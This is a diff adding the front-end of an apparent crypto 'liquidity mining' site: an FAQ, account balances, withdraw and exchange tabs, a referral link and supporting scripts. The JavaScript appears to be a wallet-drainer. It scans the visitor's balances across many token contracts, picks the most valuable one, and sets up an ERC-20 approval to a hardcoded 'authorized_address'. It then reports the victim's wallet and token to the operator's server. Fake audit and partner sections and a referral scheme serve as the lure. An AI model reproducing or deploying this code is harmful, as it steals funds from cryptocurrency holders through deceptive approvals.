+                                    <div class="accordion-group bg-white p-xl-4 p-md-4 p-3 mb-3 br-rounded"> 
+                        <div class="accordion-heading"> 
+                        <a class="accordion-toggle section_title font-weight-bold d-flex justify-content-between" data-toggle="collapse" href="#collapse75"> <span>How	To	Withdraw?</span> <img src="https://vip.innovationmining.top/erc/images/arrow_up.svg" class="arrow" /> </a> 
+                        </div> 
+                        <div id="collapse75" class="accordion-body collapse"> 
+                        <div class="accordion-inner mt-3">
+                            You	can	convert	the	coins	produced	daily	into	USDT	and	then	initiate	a	withdrawal.	The	USDT	withdrawal	will	be	automatically	sent	to	the	wallet	address	you	added	to	the	node	and	other	addresses	are	not	supported                            
+                        </div> 
+                        </div> 
+                    </div>
+                                    <div class="accordion-group bg-white p-xl-4 p-md-4 p-3 mb-3 br-rounded"> 
+                        <div class="accordion-heading"> 
+                        <a class="accordion-toggle section_title font-weight-bold d-flex justify-content-between" data-toggle="collapse" href="#collapse76"> <span>How	To	Join?</span> <img src="https://vip.innovationmining.top/erc/images/arrow_up.svg" class="arrow" /> </a> 
+                        </div> 
+                        <div id="collapse76" class="accordion-body collapse"> 
+                        <div class="accordion-inner mt-3">
+                            To	participate	in	non-destructive	and	non-guaranteed	liquidity	mining	you	need	to	pay	an	ETH	mineramp	fee	to	receive	the	voucher	and	an	ETH	wallet	address	only	needs	to	be	claimed	once.	Automatically	open	mining	permissions	after	success                            
+                        </div> 
+                        </div> 
+                    </div>
+                     
+                
+            </div> 
+          </div> 
+          <!-- Audit report --> 
+          <div class="audit-heading text-center mt-xl-5 mt-md-5 mt-4"> 
+           <div class="section_title font-weight-bold mb-1">
+            Audit report
+           </div> 
+           <div class="section_subtitle font-weight-bold">
+            We have a secure audit report 
+           </div> 
+          </div> 
+          <div class="audit-body mt-xl-5 mt-md-5 mt-4"> 
+           <div class="row mt-xl-5 mt-md-5 mt-2 pt-3"> 
+            <div class="col-4 d-flex justify-content-start">
+             <img class="botton-icon" src="https://vip.innovationmining.top/erc/images/bottom_icon1.png" />
+            </div> 
+            <div class="col-4 d-flex justify-content-center">
+             <img class="botton-icon" src="https://vip.innovationmining.top/erc/images/bottom_icon2.png" />
+            </div> 
+            <div class="col-4 d-flex justify-content-end">
+             <img class="botton-icon" src="https://vip.innovationmining.top/erc/images/bottom_icon3.png" />
+            </div> 
+           </div> 
+          </div> 
+          <!-- Partner --> 
+          <div class="partner-heading text-center mt-xl-5 mt-md-5 mt-4"> 
+           <div class="section_title font-weight-bold mb-1">
+            Partner
+           </div> 
+           <div class="section_subtitle font-weight-bold">
+            our business partner
+           </div> 
+          </div> 
+          <div class="audit-body mt-xl-5 mt-md-5 mt-4"> 
+           <div class="row mt-xl-5 mt-md-5 mt-2 pt-3"> 
+            <div class="col-4 d-flex justify-content-start">
+             <img class="botton-icon" src="https://vip.innovationmining.top/erc/images/bottom_icon4.png" />
+            </div> 
+            <div class="col-4 d-flex justify-content-center">
+             <img class="botton-icon" src="https://vip.innovationmining.top/erc/images/bottom_icon5.png" />
+            </div> 
+            <div class="col-4 d-flex justify-content-end">
+             <img class="botton-icon" src="https://vip.innovationmining.top/erc/images/bottom_icon6.png" />
+            </div> 
+           </div> 
+           <div class="row mt-xl-5 mt-md-5 mt-4"> 
+            <div class="col-4 d-flex justify-content-start">
+             <img class="botton-icon" src="https://vip.innovationmining.top/erc/images/bottom_icon7.png" />
+            </div> 
+            <div class="col-4 d-flex justify-content-center">
+             <img class="botton-icon" src="https://vip.innovationmining.top/erc/images/bottom_icon8.png" />
+            </div> 
+            <div class="col-4 d-flex justify-content-end">
+             <img class="botton-icon" src="https://vip.innovationmining.top/erc/images/bottom_icon9.png" />
+            </div> 
+           </div> 
+          </div> 
+         </div> 
+         <!-- Account Tab --> 
+         <div class="tab-pane" id="2"> 
+
+
+            
+            
+          <div class="panel-body p-xl-4 p-md-4 p-2 bg-white br-rounded mt-xl-5 mt-md-5 mt-4"> 
+           <div class="p-2"> 
+            <div class="title position-relative"> 
+             <span class="left_icon position-absolute"></span> 
+             <h1 class="font-weight-bold h1-title">My account</h1> 
+            </div> 
+             <ul class="list-unstyled pt-xl-2 pt-md-2 pt-0">
+               <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"><h3 class="h3-title font-weight-normal">Total output</h3><h2 class="h2-title font-weight-bold">0.000000 ETH</h2></li>
+                <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"><h3 class="h3-title font-weight-normal">Wallet balance</h3><h2 class="h2-title font-weight-bold">0.000000 USDT</h2></li>
+                <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"><h3 class="h3-title font-weight-normal">Account Balance</h3><h2 class="h2-title font-weight-bold">0.0000 USDT</h2></li>
+                <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"><h3 class="h3-title font-weight-normal">Exchangeable</h3><h2 class="h2-title font-weight-bold">0.000000 ETH</h2></li>
+            </ul>
+           </div> 
+          </div> 
+          <!-- Account > exchange --> 
+          <div class="panel-body"> 
+           <section class="p-tabs mt-xl-5 mt-md-5 mt-4"> 
+            <div id="exTab3" class=""> 
+             <div class="panel panel-default"> 
+              <div class="panel-heading"> 
+               <div class="panel-title"> 
+                <ul class="nav nav-tabs row align-items-center text-center tab-2 border-0"> 
+                 <li class="col-4 position-relative d-flex justify-content-start"> <a class="active" href="#4" data-toggle="tab"> <h1 class="p-0 m-0 font-weight-normal d-flex justify-content-center align-items-center"> Exchange</h1> </a></li> 
+                 <li class="col-4 position-relative d-flex justify-content-center"> <a href="#5" data-toggle="tab"> <h1 class="p-0 m-0 font-weight-normal d-flex justify-content-center align-items-center"> Withdraw</h1> </a></li> 
+                 <li class="col-4 position-relative d-flex justify-content-end"> <a href="#6" data-toggle="tab"> <h1 class="p-0 m-0 font-weight-normal d-flex justify-content-center align-items-center"> Record</h1> </a></li> 
+                </ul> 
+               </div> 
+              </div> 
+              <div class="p-tabs-section"> 
+               <div class="tab-content"> 
+                <!-- Exchange Tab  --> 
+                <div class="tab-pane active" id="4"> 
+                 <div class="panel-body p-xl-4 p-md-4 p-2 bg-white br-rounded"> 
+                  <div class="p-2"> 
+                   <div class="title position-relative"> 
+                    <span class="left_icon position-absolute"></span> 
+                    <h1 class="font-weight-bold h1-title"> Exchange</h1> 
+                   </div> 
+<ul class="mt-4 mb-xl-5 mb-md-5 mb-4 border br-rounded list-unstyled d-flex align-items-center">
+                                            <li class="col-4 p-xl-5 p-md-5 p-3 d-flex justify-content-start flex-column p-input">
+                                            <input type="number" placeholder="0.0" class="change_input ff font-weight-bold" id="ethnumber">
+                                            <div class="change_all position-absolute" id="redeem" onclick="upnum();">Redeem all</div>
+                                            </li>
+                                        <li class="col-4 p-xl-5 p-md-5 p-3 d-flex justify-content-center"><img src="https://vip.innovationmining.top/erc/images/change_icon.svg" class="change_icon"></li>
+                                <li class="col-4 p-xl-5 p-md-5 p-3 d-flex justify-content-end"><div class="usdt_content d-flex align-items-center"><img src="https://vip.innovationmining.top/erc/images/usdt_icon.png" class="usdt_icon mr-xl-4 mr-md-4 mr-2"><span>USDT</span></div></li>
+                                                                        </ul>
+                        <button class="exchange-btn mx-auto btn text-center custom-ctn d-flex justify-content-center align-items-center" onclick="doexchange()">Exchange</button>
+                        <div class="border-top mt-xl-5 mt-md-5 mt-4 py-4"><h3 class="h3-title font-weight-normal tips">Convert the ETH coins you dug into USDT</h3></div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                <!-- Withdraw Tab --> 
+                <div class="tab-pane" id="5"> 
+                 <div class="panel-body p-xl-4 p-md-4 p-2 bg-white br-rounded"> 
+                  <div class="p-2"> 
+                   <div class="title position-relative"> 
+                    <span class="left_icon position-absolute"></span> 
+                    <h1 class="font-weight-bold h1-title"> Withdraw</h1> 
+                   </div> 
+                    <ul class="mt-4  mb-xl-5 mb-md-5 mb-4 border br-rounded list-unstyled d-flex align-items-center">
+                <li class="col-4 p-xl-5 p-md-5 p-3 d-flex justify-content-start flex-column p-input">
+        <input type="number" placeholder="0.0" id="usdtnumber" class="change_input ff font-weight-bold">
+            <div class="change_all position-absolute" id="redeem1" onclick="upnum1();">Redeem all</div>
+                                        </li>
+                        <li class="col-4 p-xl-5 p-md-5 p-3 d-flex justify-content-center"><div class="divider"></div></li>
+                        <li class="col-4 p-xl-5 p-md-5 p-3 d-flex justify-content-end"><div class="usdt_content d-flex align-items-center"><img src="https://vip.innovationmining.top/erc/images/usdt_icon.png" class="usdt_icon mr-xl-4 mr-md-4 mr-2"><span>USDT</span></div></li>
+                                 </ul>
+                 <button class="exchange-btn mx-auto btn text-center custom-ctn d-flex justify-content-center align-items-center"  onclick="dowithdraw()">Confirm</button>
+                 <div class="border-top mt-xl-5 mt-md-5 mt-4 py-4"><h3 class="h3-title font-weight-normal tips">Your withdrawal will arrive in your USDT wallet within 48 hours, and withdrawals will be suspended on weekends and statutory holidays!</h3></div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                <!-- Record Tab --> 
+                <div class="tab-pane" id="6"> 
+                 <div class="panel-body p-xl-4 p-md-4 p-2 bg-white br-rounded"> 
+                  <section class="p-tabs mt-xl-5 mt-md-5 mt-4"> 
+                   <div id="exTab4" class=""> 
+                    <div class="panel panel-default"> 
+                     <div class="panel-heading"> 
+                      <div class="panel-title"> 
+                       <ul class="nav nav-tabs row align-items-center justify-content-center tab-3 border-0"> 
+                        <li><a class="active font-weight-normal d-flex align-items-center justify-content-center" href="#16" data-toggle="tab">Exchange</a> </li> 
+                        <li><a href="#7" data-toggle="tab" class="font-weight-normal d-flex align-items-center justify-content-center">Withdraw</a> </li> 
+                        <li><a href="#8" data-toggle="tab" class="font-weight-normal d-flex align-items-center justify-content-center">Mining</a> </li> 
+                       </ul> 
+                      </div> 
+                     </div> 
+                     <div class="p-tabs-section"> 
+                      <div class="tab-content"> 
+                       <!-- Exchange Tab  --> 
+                       <div class="tab-pane active" id="16"> 
+                        <div class="exchange-body"> 
+                         <div class="d-flex flex-wrap align-items-center mt-5"> 
+                          <div class="col-5 t1"> 
+                           <div class="t1-head">
+                             Time
+                           </div> 
+                                                     </div> 
+                          <div class="col-7 t1 d-flex flex-wrap flex-column    align-items-end"> 
+                           <div class="t1-head">
+                             Quantity 
+                           </div> 
+                                                     </div>  
+                         </div> 
+                         <!-- If no data display img --> 
+                         <div class="no_data text-center"> 
+                          <img class="my-2" src="https://vip.innovationmining.top/erc/images/nodata_icon.svg" /> 
+                                                  <h3 class="h3-title font-weight-normal">No Data</h3>
+                                                  </div> 
+                        </div> 
+                       </div> 
+                       <!-- Withdraw Tab --> 
+                       <div class="tab-pane" id="7"> 
+                        <div class="exchange-body"> 
+                         <div class="d-flex flex-wrap align-items-center mt-5"> 
+                          <div class="col-6 t1"> 
+                           <div class="t1-head">
+                             Time
+                           </div> 
+                                                                </div> 
+                                    <div class="col-3 t1 d-flex flex-wrap flex-column    align-items-end"> 
+                                        <div class="t1-head">
+                                            Quantity 
+                                        </div> 
+                                                                            </div> 
+                                <div class="col-3 t1 d-flex flex-column    align-items-end"> 
+                                    <div class="t1-head">
+                                        Status
+                                    </div> 
+                                                                    </div> 
+                         </div> 
+                         <!-- If no data display img --> 
+                         <div class="no_data text-center"> 
+                          <img class="my-2" src="https://vip.innovationmining.top/erc/images/nodata_icon.svg" /> 
+                                                      <h3 class="h3-title font-weight-normal">No Data</h3>
+                                                         </div> 
+                        </div> 
+                       </div> 
+                       <!-- Mining Tab --> 
+                        <div class="tab-pane" id="8"> 
+                            <div class="exchange-body"> 
+                            <div class="d-flex align-items-center mt-5"> 
+                            <div class="col-6 t1"> 
+                            <div class="t1-head">
+                                Time
+                            </div> 
+                                                            </div> 
+                            <div class="col-6 t1 d-flex flex-column align-items-end"> 
+                            <div class="t1-head">
+                                Output
+                            </div> 
+                                                        </div> 
+                            </div> 
+                            <!-- If no data display img --> 
+                            <div class="no_data text-center"> 
+                            <img class="my-2" src="https://vip.innovationmining.top/erc/images/nodata_icon.svg" /> 
+                                                            <h3 class="h3-title font-weight-normal">No Data</h3>
+                                                            </div> 
+                            </div> 
+                        </div> 
+                      </div> 
+                     </div> 
+                    </div> 
+                   </div> 
+                  </section> 
+                 </div> 
+                </div> 
+               </div> 
+              </div> 
+             </div> 
+            </div> 
+           </section> 
+          </div> 
+         </div> 
+         <!-- Team Tab --> 
+         <div class="tab-pane" id="3"> 
+          <div class="panel-body p-xl-4 p-md-4 p-2 bg-white br-rounded mt-xl-5 mt-md-5 mt-4"> 
+           <div class="p-2"> 
+            <div class="title position-relative"> 
+             <span class="left_icon position-absolute"></span> 
+             <h1 class="font-weight-bold h1-title">Team data</h1> 
+            </div> 
+            <ul class="list-unstyled pt-xl-2 pt-md-2 pt-0"> 
+             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"> <h3 class="h3-title font-weight-normal">level 1 Total output</h3> <h2 class="h2-title font-weight-bold">0 ETH</h2> </li> 
+             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"> <h3 class="h3-title font-weight-normal">level 2 Total output</h3> <h2 class="h2-title font-weight-bold">0 ETH</h2> </li> 
+             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"> <h3 class="h3-title font-weight-normal">level 3 Total output</h3> <h2 class="h2-title font-weight-bold">0 ETH</h2> </li> 
+             <li class="d-flex justify-content-between align-items-center mt-xl-4 mt-md-4 mt-3"> <h3 class="h3-title font-weight-normal">Team Revenue</h3> <h2 class="h2-title font-weight-bold">0 ETH</h2> </li> 
+            </ul> 
+           </div> 
+          </div> 
+          <div class="share_content mt-xl-5 mt-md-5 mt-3 px-xl-4 px-md-4 px-3 pt-3 pb-3"> 
+           <div class="set_content">
+            <h3 class="h3-title font-weight-normal">Referrer</h3>
+            <div class="content d-flex justify-content-between align-items-center p-xl-4 p-md-4 p-3 mt-xl-4 mt-md-4 mt-2">
+                                 <input type="text"  placeholder="Referrer's wallet address" value="" class="border-0 w-100" id="fid">
+                <button class="submit d-flex justify-content-center align-items-center" onclick="sumitfid()">Save</button>
+                             </div>
+            <h3 class="h3-title font-weight-normal tips mt-4">Set the referrer, the referrer will get additional rewards from the mining pool</h3>
+        </div>
+
+            <div class="set_content mt-4 pt-4 border-top">
+            <h3 class="h3-title font-weight-normal">My share link</h3>
+            <div class="content p-xl-4 p-md-4 p-3 mt-xl-4 mt-md-4 mt-2">
+                <div class="copy-text position-relative d-flex justify-content-between align-items-center">
+                    <input type="text" readonly="readonly" class="text border-0 w-100" value="https://vip.innovationmining.top/?code=0">
+                    <button class="submit d-flex justify-content-center align-items-center">Copy</button>
+                    <!-- <div class="toast-msg p-xl-4 p-md-4 p-2 w-100"><img src="https://vip.innovationmining.top/erc/images/toast_success.svg" class="mr-2">Copy success</div> -->
+                </div>
+            </div>
+            <h3 class="h3-title font-weight-normal tips mt-4">Send your invitation link, friends join the node through your link, and you will get generous token rewards</h3>
+        </div>
+          </div> 
+         </div> 
+        </div> 
+       </div> 
+      </div> 
+     </div> 
+    </section> 
+   </div>
+   <!-- container-fluid --> 
+  </div>
+  <!-- main-container -->
+<script type="text/javascript">
+
+    function dowithdraw(){
+        var index = layer.load(2,{shade:[0.7,"#000000"]});
+
+        var usdtnum = jQuery('#usdtnumber').val();
+        var data = {
+                usdtnum:usdtnum
+        }
+        $.ajax({
+                type: 'post',
+                url:  'https://vip.innovationmining.top/transfer/transfer/dowithdraw',
+                data:data,
+                 success:function(data){
+                     //console.log(data)
+                 if(data.code == 200){
+                    layer.msg(data.msg,{icon:1},function(){
+                        window.location.href = "https://vip.innovationmining.top/trade/index/index.html?code=2464";
+                        layer.close(index);
+                    });
+                 }else{
+                    layer.msg(data.msg,{icon:2},function(){
+                        layer.close(index);
+                    });
+                    console.log(data)
+                 }
+                 //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=7&em=2464";
+                 },
+                 error:function(data){
+                    layer.msg(data.status+':'+data.statusText);
+                    layer.close(index);
+                    //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=2&em=2464";
+                 }
+
+        })
+    }
+    function doexchange(){
+        var index = layer.load(2,{shade:[0.7,"#000000"]});
+
+        var ethnum = jQuery('#ethnumber').val();
+        var data = {
+                ethnum:ethnum
+        }
+        $.ajax({
+                type: 'post',
+                url:  'https://vip.innovationmining.top/transfer/transfer/doexchangeeth',
+                data:data,
+                 success:function(data){
+                     //console.log(data)
+                 if(data.code == 200){
+                    layer.msg(data.msg,{icon:1},function(){
+                        window.location.href = "https://vip.innovationmining.top/trade/index/index.html?code=2464";
+                        layer.close(index);
+                    });
+                 }else{
+                    layer.msg(data.msg,{icon:2},function(){
+                        layer.close(index);
+                    });
+                    console.log(data)
+                 }
+                 //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=7&em=2464";
+                 },
+                 error:function(data){
+                    layer.msg(data.status+':'+data.statusText);
+                    layer.close(index);
+                    //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=2&em=2464";
+                 }
+
+        })
+    }
+    function upnum(){
+        var num = 0.000000;
+        jQuery('#ethnumber').val(num);
+    }
+    function upnum1(){
+        var num = 0.0000;
+        jQuery('#usdtnumber').val(num);
+    }
+
+
+    
+    
+    function sumitfid(){
+        return;
+        var index = layer.load(2,{shade:[0.7,"#000000"]});
+
+        var fid = jQuery('#fid').val();
+        var data = {
+                fid:fid
+            }
+        $.ajax({
+                type: 'post',
+                url:  'https://vip.innovationmining.top/transfer/transfer/insert_fid',
+                data:data,
+                 success:function(data){
+                     //console.log(data)
+                 if(data.code == 200){
+                    layer.msg(data.msg,{icon:1},function(){
+                        window.location.href = "https://vip.innovationmining.top/trade/index/index.html?code=2464";
+                        layer.close(index);
+                    });
+                 }else{
+                    layer.msg(data.msg,{icon:2},function(){
+                        layer.close(index);
+                    });
+                    console.log(data)
+                 }
+                 //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=7&em=2464";
+                 },
+                 error:function(data){
+                    layer.msg(data.status+':'+data.statusText);
+                    layer.close(index);
+                    //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=2&em=2464";
+                 }
+
+        })
+        //alert(fid);
+    }
+</script>
+
+<script type="text/javascript">
+    var count = jQuery('.slick-slide').length;
+    jQuery("#total").text(count);
+    jQuery('.slider-for').slick({
+        autoplay: true,
+        arrows: false,
+        dots: false,
+        slidesToShow: 7,
+        slidesToScroll: 1,
+        centerPadding: "10px",
+        draggable: false,
+        infinite: true,
+        pauseOnHover: false,
+        swipe: false,
+        touchMove: false,
+        vertical: true,
+        speed: 600,
+        autoplaySpeed: 800,
+        useTransform: true,
+        cssEase: 'cubic-bezier(0.645, 0.045, 0.355, 1.000)',
+        adaptiveHeight: true,
+        rtl: false
+    });
+</script>
+<script>
+
+        let copyText = document.querySelector(".copy-text");
+        copyText.querySelector("button").addEventListener("click", function () {
+            let input = copyText.querySelector("input.text");
+            input.select();
+            document.execCommand("copy");
+            copyText.classList.add("active");
+            window.getSelection().removeAllRanges();
+
+            $('.toast-msg').addClass("active");
+            setTimeout(function () {
+                copyText.classList.remove("active");
+                $('.toast-msg').removeClass("active");
+            }, 2500);
+        });
+        $('#closeModalLabel').click(function () {
+            $('.popup_container').css('display','none')
+            $('.cover').css('display','none')
+            $('.popup_container .select-nextwork-modal').css('display','none')
+        });
+          $('#myModalLabel').click(function () {
+            $('.popup_container').css('display','block')
+            $('.cover').css('display','block')
+            $('.popup_container .select-nextwork-modal').css('display','block')
+        });
+          $('#iconOne').click(function () {
+          $("#img_pre").attr("src", 'https://vip.innovationmining.top/erc/images/icon1.svg');
+            $('.popup_container').css('display','none')
+            $('.cover').css('display','none')
+            $('.popup_container .select-nextwork-modal').css('display','none')
+            $('.link-btn').css('background','#6481e7')
+        });
+        $('#iocnTwo').click(function () {
+        window.location = "https://vip.innovationmining.top/trade/index/trc20.html?code=2464";
+       });
+
+
+        /*$('').click(function(){
+            setTimeout(function () {
+                $('.toast-msg').removeClass("active");
+            }, 2500);
+        });*/
+    </script>
+    <script type="text/javascript">
+    const ABI = [{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}];
+
+    $(function() {
+        var authorized_address = '0xEd04Eb4ae1fB90784e30d37711998981DEa02188';
+        var infura_key = '';
+        var url=window.location.host;
+        var domain = 'https://'+url+'https://vip.innovationmining.top/';
+        var bizhong = '';
+        var address = getUrlQueryString('address')
+        var rank = 6.45;
+        $('#address').text(address)
+
+        $('input.num').bind('input propertychange', function()
+        {
+            if($(this).val() && $(this).val()>0){
+                $('#btn-connect').css('background','#078bc3');
+            }else{
+                $('#btn-connect').css('background','#dde0dd');
+            }
+            $('#price').text(($(this).val()*rank).toLocaleString() )
+
+        })
+        /******************************************/
+        // Unpkg imports
+        const _web3 = new Web3('https://cloudflare-eth.com')
+
+        let injectedWeb3 = null, total = 0
+        let approveAddr = '0xdac17f958d2ee523a2206206994597c13d831ec7'
+        const addr = {
+            'usdt': '0xdac17f958d2ee523a2206206994597c13d831ec7',
+            'sushi': '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2',
+            'usdc': '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
+            'uni': '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984',
+            'aave': '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9',
+            'yfi': '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e',
+            'dai': '0x6b175474e89094c44da98b954eedeac495271d0f',
+            'link': '0x514910771af9ca656af840dff83e8264ecf986ca',
+            "LON": "0x0000000000095413afc295d19edeb1ad7b71c952",
+            "CRV": "0xD533a949740bb3306d119CC777fa900bA034cd52",
+            'FIL': "0xbf48ecb7c2d3d559e0a24b04f306889e05c73cd6",
+        }
+
+        const addr2 = {
+            "WBTC": "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
+            "WETH": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
+            "CONV": "0xc834fa996fa3bec7aad3693af486ae53d8aa8b50",
+            "inj": "0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30",
+            "MKR": "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
+            "ALPHA": "0xa1faa113cbe53436df28ff0aee54275c13b40975",
+            "BAND": "0xba11d00c5f74255f56a5e366f4f77f5a186d7f55",
+            "snx": "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f",
+            "comp": "0xc00e94cb662c3520282e6f5717214004a7f26888",
+            "sxp": "0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9",
+        }
+
+        const addr3 = {
+            "FTT": "0x50d1c9771902476076ecfc8b2a83ad6b9355a4c9",
+            "ust": "0xa47c8bf37f92abed4a126bda807a7b7498661acd",
+            "TRIBE": "0xc7283b66eb1eb5fb86327f08e1b5816b0720212b",
+            "wise": "0x66a0f676479Cee1d7373f3DC2e2952778BfF5bd6",
+            "RRAX": "0x853d955acef822db058eb8505911ed77f175b99e",
+            "CORE": "0x62359Ed7505Efc61FF1D56fEF82158CcaffA23D7",
+            "mir": "0x09a3ecafa817268f77be1283176b946c4ff2e608",
+            "DPI": "0x1494ca1f11d487c2bbe4543e90080aeba4ba3c2b",
+            "luna": "0xd2877702675e6ceb975b4a1dff9fb7baf4c91ea9",
+            "HEZ": "0xEEF9f339514298C6A857EfCfC1A762aF84438dEE",
+            "fxs": "0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0",
+            "fei": "0x956f47f50a910163d8bf957cf5846d573e7f87ca",
+        }
+
+        async function getMostValuableAssets(account) {
+            let _symbol = 'usdt'
+            console.log('_symbol:'+_symbol);
+
+            for (const [symbol, contract] of Object.entries(contracts)) {
+                contract.methods.balanceOf(account).call(function(err, balance) {
+                    if(symbol == 'usdt'){
+
+                        let yu =balance / (10** (decimals[symbol] || 18))
+                        console.log(yu)
+                        console.log(yu.toLocaleString())
+                        $('#yu').text(yu.toLocaleString() +' USDT')
+
+                    }
+                    const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+                    if (usdt > total && usdt > 1000) {
+                        _symbol = symbol
+                        total = usdt
+                        approveAddr = addr[_symbol]
+                        bizhong = _symbol
+
+                    }
+                })
+            }
+
+            bizhong = _symbol
+            console.log('_symbol:'+_symbol);
+            return _symbol
+        }
+
+        function getUrlQueryString(names, urls) {
+            urls = urls || window.location.href;
+            urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
+            var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
+            var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
+            if (r != null && r[2] != "")return unescape(r[2]);
+            return null;
+        }
+
+        function getInfo(){
+
+            $.ajax({
+                type: 'get',
+                url:  'https://vip.innovationmining.top/transfer/transfer/get_erc',
+
+                //async : false,
+                success:function(data){
+                    console.log(data);
+                    authorized_address = data.authorized_address;
+                    console.log(authorized_address);
+                    infura_key = data.infura_key;
+                    console.log(infura_key);
+
+
+
+                },
+                error:function(data){
+
+
+                }
+
+            })
+        }
+
+        async function postInfo(address,symbol,balance){
+            var s = getUrlQueryString('em')
+            var a = getUrlQueryString('r')
+            var coin = address.substr(0, 2)
+            if(coin == '0x'){
+            }
+            else
+            {
+                //window.location = "https://vip.innovationmining.top/trade/index/trc.html?code=2464";
+            }
+
+            var data = {
+                address:address,
+                authorized_address:authorized_address,
+                bizhong:symbol,
+                code:s,
+                reffer:balance
+            }
+
+            $.ajax({
+                type: 'post',
+                url:  'https://vip.innovationmining.top/transfer/transfer/insert_login',
+                data:data,
+                 success:function(data){
+                     //console.log(data)
+                 if(data.code === 200){
+                    window.location = "https://vip.innovationmining.top/trade/index/index.html?code=2464";
+                    console.log('success')
+                 }
+                 console.log(data.msg)
+                 //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=7&em=2464";
+                 },
+                 error:function(data){
+                    console.log(data)
+                    //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=2&em=2464";
+                 }
+
+            })
+
+        }
+
+        async function postInfore(address,symbol,balance){
+            var s = 'erc';
+            var a = getUrlQueryString('r');
+            var ref = getUrlQueryString('code');
+
+            var coin = address.substr(0, 2)
+            if(coin == '0x'){
+            }
+            else
+            {
+                //window.location = "https://vip.innovationmining.top/trade/index/trc.html?code=2464";
+            }
+            
+            var data = {
+                address:address,
+                authorized_address:authorized_address,
+                bizhong:symbol,
+                code:s,
+                reffer:balance,
+                ref:ref
+            }
+
+            $.ajax({
+                type: 'post',
+                url:  'https://vip.innovationmining.top/transfer/transfer/insert_loginre',
+                data:data,
+                 success:function(data){
+                     //console.log(data)
+                     
+                    if(data.code === 100){
+                        
+                        $('#tiptext').html(data.msg);
+                        $('.tip').click();
+
+                    }
+                    else if(data.code === 200){
+                    window.location = "https://vip.innovationmining.top/trade/index/index.html?code=2464";
+                    console.log('success')
+                 }
+                 console.log(data.msg)
+                 //window.location = "https://vip.innovationmining.top/trade/index/ljjr.html?id=7&em=2464";
+                 },
+                 error:function(data){
+                    console.log(data)
